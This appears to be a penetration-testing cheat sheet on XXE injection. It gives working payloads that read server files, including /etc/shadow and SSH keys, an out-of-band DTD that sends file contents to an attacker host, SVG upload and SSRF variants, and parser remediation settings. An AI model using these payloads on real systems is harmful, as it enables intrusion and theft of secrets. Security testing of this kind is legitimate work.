# XXE - XML External Entity Injection

---

## What It Is

When an application parses XML and the XML parser has **external entities enabled**, you can define an entity that references a file or URL - and the server includes its content in the response.

Result: arbitrary file read on the server, or SSRF via the XML parser.

---

## Where to Look

- Any request with `Content-Type: application/xml` or `text/xml`
- SOAP web services
- File upload that accepts XML, XLSX, DOCX, SVG (all ZIP+XML formats)
- Any feature that parses XML input (search, config import, profile update)

---

## Basic File Read

Replace the XML body with:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

Send this as the request body - if the response includes `/etc/passwd` content -> XXE confirmed.

**Windows targets:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">
```

**Useful Linux files to read:**
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ          # environment variables (may contain secrets)
file:///proc/self/cmdline          # how the process was started
file:///var/www/html/config.php    # web app config (adjust path)
file:///home/<user>/.ssh/id_rsa    # SSH private key
```

---

## SSRF via XXE

Instead of file://, use http://:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://<your-ip>/test">
]>
<root><data>&xxe;</data></root>
```

Use this to probe internal services - same targets as [SSRF](ssrf.md).

---

## Blind XXE (No Output in Response)

When the file content doesn't appear in the response, use out-of-band exfiltration.

**Step 1 - Host a malicious DTD on your machine:**
```xml
<!-- evil.dtd - serve this from your HTTP server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<your-ip>/?data=%file;'>">
%eval;
%exfil;
```

**Step 2 - Reference your DTD in the XML:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<your-ip>/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>
```

**Step 3 - Watch your HTTP server** for the incoming request with the file content in the URL parameter.

```sh
python3 -m http.server 80
# Look for: GET /?data=root:x:0:0:root:/root:/bin/bash...
```

---

## SVG Upload XXE

If the app accepts SVG image uploads, embed XXE in the SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload as a `.svg` file. If the server renders/processes it and returns the SVG content, you'll see the file.

---

## Quick Detection Payload

If you're not sure if XML is being parsed, add an entity that makes an outbound request:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<your-ip>/xxetest">]>
<foo>&xxe;</foo>
```

Catch it on:
```sh
nc -lvnp 80
```

If you get a connection -> parser is vulnerable.

---

## Remediation

**Root cause:** The XML parser has external entity processing enabled. This is a parser configuration issue - the application doesn't need external entities but the parser allows them by default in many languages/libraries.

| Finding | Remediation |
|---|---|
| XXE in XML input | **Disable external entity processing in the XML parser.** This is a one-line config change in most languages - it's the correct and complete fix. |
| PHP (libxml) | `libxml_disable_entity_loader(true)` (PHP < 8.0) or use `LIBXML_NONET` flag: `simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET)` |
| Java (SAXParser, DocumentBuilder) | `factory.setFeature("http://xml.org/sax/features/external-general-entities", false)` and `factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)` |
| Python (lxml) | Use `resolve_entities=False`: `etree.parse(source, etree.XMLParser(resolve_entities=False))` |
| .NET | `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` |
| SVG upload with embedded XXE | Treat SVG as a code format, not an image. Process SVGs through a sanitizer (e.g., DOMPurify for SVG). Or reject SVG entirely if not needed. Re-encode images using Pillow/ImageMagick (strips XML content). |
| XLSX/DOCX processing | Use library-level safe parsing modes. Don't extract and re-parse the internal XML manually. |

**Key point for reports:** XXE is a parser misconfiguration, not an application logic bug. The fix is always in the XML parser configuration - it doesn't require rewriting application logic. This makes it a quick win for developers to fix once identified.
